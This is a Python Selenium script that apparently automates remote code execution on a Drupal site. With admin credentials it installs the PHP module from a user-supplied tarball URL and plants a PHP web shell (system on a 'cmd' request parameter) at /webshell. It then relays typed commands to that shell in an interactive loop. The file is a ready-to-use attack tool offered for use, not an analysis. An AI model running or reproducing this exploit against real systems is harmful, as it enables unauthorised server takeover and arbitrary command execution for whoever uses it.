import sys
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys

def webshell(driver):
    phpcode = """
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
"""
    driver.get(f"{URL}node/add/page")
    driver.find_element_by_id("edit-title-0-value").send_keys("webshell")
    driver.find_element_by_xpath("/html/body/div[2]/div/main/div[4]/div/form/div/div[2]/div/details[2]/summary").click()
    driver.find_element_by_id("edit-path-0-alias").send_keys("/webshell")
    print(f"THIS PART MUST BE DONE MANUALLY. Press 'source' and use the drop down to select 'PHP Code'. Once you've done that, copy this code into the body:\n\n{phpcode}")
    input("\nPress enter to continue.")
    driver.find_element_by_id("edit-submit").click()
    command = ""
    while command.lower() != "exit":
        command = input("5yn> ")
        driver.get(f"{URL}webshell?cmd={command}")
 
    
    

def main():
    login = f"{URL}user/login"
    driver = webdriver.Firefox()
    driver.get(login)
    driver.find_element_by_id("edit-name").send_keys(creds[0])
    driver.find_element_by_id("edit-pass").send_keys(creds[1])
    driver.find_element_by_id("edit-submit").click()
    driver.get(f"{URL}admin/modules/install")
    driver.find_element_by_id("edit-project-url").send_keys(sys.argv[3])
    driver.find_element_by_id("edit-submit").click()
    driver.get(f"{URL}admin/modules")
    driver.find_element_by_id("edit-modules-php-enable").click()
    driver.find_element_by_id("edit-submit").click()
    input("Please press enter once the install is complete")
    webshell(driver)

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <Drupal URL> <username:password> <local php install webserver>")
        print(f"Example: {sys.argv[0]} http://mydrupal.com admin:admin http://192.168.1.123:4444/php.tar.gz")
        sys.exit()
    URL = sys.argv[1]
    creds = sys.argv[2].split(":")
    if URL[-1] != "/":
        URL += "/"
    main()
